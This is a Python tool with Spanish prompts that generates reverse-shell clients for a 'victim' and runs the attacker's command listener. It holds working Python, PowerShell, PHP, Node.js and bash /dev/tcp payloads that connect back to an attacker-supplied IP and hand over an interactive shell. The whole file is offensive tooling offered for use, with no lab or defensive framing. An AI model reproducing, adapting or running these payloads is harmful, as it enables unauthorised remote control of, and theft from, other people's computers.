import os
import socket
import subprocess
import platform
import re

# Colores para terminal (Windows no los soporta por defecto)
if platform.system() == "Windows":
    RED, GREEN, CYAN, RESET = "", "", "", ""
else:
    RED, GREEN, CYAN, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[0m"


def banner():
    print(f"""{CYAN}
 █████╗ ██╗   ██╗████████╗ ██████╗ ███████╗██╗  ██╗██╗     
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔════╝██║  ██║██║     
███████║██║   ██║   ██║   ██║   ██║███████╗███████║██║     
██╔══██║██║   ██║   ██║   ██║   ██║╚════██║██╔══██║██║     
██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║██║  ██║███████╗
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝
{RESET}---- By: MARH ------------------------------------------- {RESET}""")


def get_option(prompt, valid_options):
    while True:
        choice = input(prompt).strip()
        if choice in valid_options:
            return choice
        print(f"{RED}[!] Opción inválida. Inténtalo de nuevo.{RESET}")


def validate_ip(ip):
    return re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip)


def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535


def validate_path(path):
    path = os.path.expanduser(path)  # Expande rutas como ~/Desktop
    return os.path.isdir(path)


def get_user_input():
    print("\n📌 Selecciona el sistema operativo de la víctima:")
    os_choice = get_option("1️⃣ Windows\n2️⃣ Linux / MacOS\n\n[+] Opción: ", ["1", "2"])

    print("\n📌 Selecciona el lenguaje para la shell reversa:")
    lang_options = ["1", "2", "3", "4", "5"] if os_choice == "2" else ["1", "5"]
    lang_choice = get_option("1️⃣ Python\n2️⃣ PHP\n3️⃣ JavaScript (Node.js)\n4️⃣ Bash\n5️⃣ PowerShell\n\n[+] Opción: ",
                             lang_options)

    while True:
        attacker_ip = input("[+] IP del atacante: ").strip()
        if validate_ip(attacker_ip):
            break
        print(f"{RED}[!] IP inválida. Inténtalo de nuevo.{RESET}")

    while True:
        port = input("[+] Puerto a usar: ").strip()
        if validate_port(port):
            break
        print(f"{RED}[!] Puerto inválido. Ingresa un número entre 1 y 65535.{RESET}")

    while True:
        save_path = input("[+] Ruta donde guardar los archivos: ").strip()
        save_path = os.path.abspath(save_path)  # Convierte a ruta absoluta
        if validate_path(save_path):
            break
        print(f"{RED}[!] Ruta no válida. Asegúrate de que existe.{RESET}")

    return os_choice, lang_choice, attacker_ip, port, save_path


SHELLS = {
    "1": {  # Windows
        "1": ("reverse_python.py", """import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{}", {}))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit": break
    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    s.send(output.stdout.encode() + output.stderr.encode())
s.close()"""),

        "5": ("reverse_powershell.ps1", """$client = New-Object System.Net.Sockets.TCPClient("{}", {})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()"""),
    },

    "2": {  # Linux / MacOS
        "1": ("reverse_python.py", """import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{}", {}))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit": break
    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    s.send(output.stdout.encode() + output.stderr.encode())
s.close()"""),

        "2": ("reverse_php.php", """<?php
$sock=fsockopen("{}", {});
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""),

        "3": ("reverse_node.js", """const net = require("net");
const {{ exec }} = require("child_process");
const client = new net.Socket();
client.connect({}, "{}", () => {{}}); 
client.on("data", (data) => {{
    exec(data.toString(), (error, stdout, stderr) => {{
        client.write(stdout + stderr);
    }});
}});"""),

        "4": ("reverse_bash.sh", """#!/bin/bash
bash -i >& /dev/tcp/{}/{} 0>&1"""),
    }
}


def generate_shell(os_choice, lang_choice, attacker_ip, port, save_path):
    if lang_choice in SHELLS[os_choice]:
        filename, shell_content = SHELLS[os_choice][lang_choice]
        file_path = os.path.join(save_path, filename)

        with open(file_path, "w") as f:
            f.write(shell_content.format(attacker_ip, port))

        print(f"{GREEN}✅ Cliente guardado en: {file_path}{RESET}")
    else:
        print(f"{RED}❌ Error al generar los archivos. Verifica las opciones.{RESET}")


def start_server(attacker_ip, port):
    # Crear socket para escuchar conexiones
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((attacker_ip, port))
    s.listen(1)  # Escuchar una conexión
    print(f"📡 Esperando conexión en {attacker_ip}:{port}...")

    # Aceptar la conexión de la víctima
    conn, addr = s.accept()
    print(f"✅ Conexión recibida de {addr}")

    # Interactuar con la víctima
    while True:
        cmd = input(f"{attacker_ip} > ")
        
        if cmd.lower() == "exit":
            conn.send(cmd.encode())
            break

        conn.send(cmd.encode())
        response = conn.recv(4096).decode()
        print(response)

    conn.close()
    s.close()


if __name__ == "__main__":
    banner()
    os_choice, lang_choice, attacker_ip, port, save_path = get_user_input()
    generate_shell(os_choice, lang_choice, attacker_ip, port, save_path)
    start_server(attacker_ip, port)
